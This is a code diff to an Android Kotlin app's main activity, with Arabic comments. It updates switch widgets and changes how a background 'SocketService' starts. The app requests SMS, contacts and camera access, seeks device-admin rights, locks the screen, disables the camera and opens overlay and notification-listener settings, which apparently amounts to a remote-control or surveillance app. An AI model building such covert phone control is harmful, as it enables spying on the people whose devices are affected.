@@ -9,38 +9,45 @@ import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
 import android.widget.Button
-import android.widget.Switch
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
+// استخدمنا SwitchMaterial عشان يطابق اللي في الواجهة
+import com.google.android.material.switchmaterial.SwitchMaterial
 
 class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        val switchCamera = findViewById<Switch>(R.id.switchCamera)
-        val switchApps = findViewById<Switch>(R.id.switchApps)
-        val switchNotif = findViewById<Switch>(R.id.switchNotif)
+        // التصحيح هنا: SwitchMaterial بدل Switch
+        val switchCamera = findViewById<SwitchMaterial>(R.id.switchCamera)
+        val switchApps = findViewById<SwitchMaterial>(R.id.switchApps)
+        val switchNotif = findViewById<SwitchMaterial>(R.id.switchNotif)
+        
         val btnAdmin = findViewById<Button>(R.id.btnAdmin)
         val btnLockNow = findViewById<Button>(R.id.btnLockNow)
         val statusText = findViewById<TextView>(R.id.statusText)
 
-        // طلب الصلاحيات الأساسية
+        // طلب الصلاحيات
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 101)
         }
         ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS, android.Manifest.permission.CAMERA), 102)
 
-        // تشغيل السيرفر في الخلفية
+        // تشغيل السيرفر في الخلفية مع حماية من الكراش
         try {
-            startService(Intent(this, SocketService::class.java))
+            val intent = Intent(this, SocketService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
         } catch (e: Exception) {
-            Toast.makeText(this, "خطأ في تشغيل الخدمة", Toast.LENGTH_SHORT).show()
+            statusText.text = "خطأ في الخدمة: ${e.message}"
         }
 
-        // تفعيل الأدمن
         btnAdmin.setOnClickListener {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
             intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this, MyDeviceAdminReceiver::class.java))
@@ -48,7 +55,6 @@ class MainActivity : AppCompatActivity() {
             startActivity(intent)
         }
 
-        // قفل الشاشة فورا
         btnLockNow.setOnClickListener {
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
@@ -59,7 +65,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // سويتش الكاميرا
         switchCamera.setOnCheckedChangeListener { _, isChecked ->
             val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
             val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
@@ -73,7 +78,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // سويتش التطبيقات
         switchApps.setOnCheckedChangeListener { _, isChecked ->
             if (isChecked) {
                 if (!Settings.canDrawOverlays(this)) {
@@ -83,7 +87,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // سويتش الإشعارات
         switchNotif.setOnCheckedChangeListener { _, isChecked ->
             if (isChecked) {
                 startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
